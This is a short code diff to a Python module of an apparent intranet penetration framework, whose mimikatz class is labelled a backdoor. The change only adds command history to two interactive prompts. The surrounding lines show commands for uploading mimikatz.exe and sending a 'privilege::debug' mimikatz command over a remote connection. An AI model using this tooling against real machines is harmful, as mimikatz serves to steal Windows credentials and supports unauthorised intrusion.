@@ -2,6 +2,7 @@ import struct
 from prompt_toolkit import prompt
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.history import InMemoryHistory
 from AuxiliaryFunctions import uploadCVE
 
 from AuxiliaryFunctions import MyTable
@@ -12,9 +13,10 @@ class mimikatz:
         commands = ["upload mimikatz.exe", "show functions", "back", "show params"]
         completer = WordCompleter(commands)
         formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/mimikatz] \033[0m')
+        history = InMemoryHistory()
         while True:
             try:
-                choice = prompt(formatted_text1, completer=completer)
+                choice = prompt(formatted_text1, completer=completer, history=history)
                 if choice.lower() == 'show functions':
                     self.show_functions()
                     continue
@@ -141,8 +143,9 @@ class mimikatz:
         commands = ["back", "privilege::debug"]
         completer = WordCompleter(commands)
         formatted_text1 = ANSI('\033[1;1;1mmimikatz > \033[0m')
+        history = InMemoryHistory()
         while True:
-            command = prompt(formatted_text1, completer=completer)
+            command = prompt(formatted_text1, completer=completer, history=history)
             if command == "privilege::debug":
                 command1 = "mimikatz.exe \"privilege::debug\" exit"
                 self.receive(conn, command1)
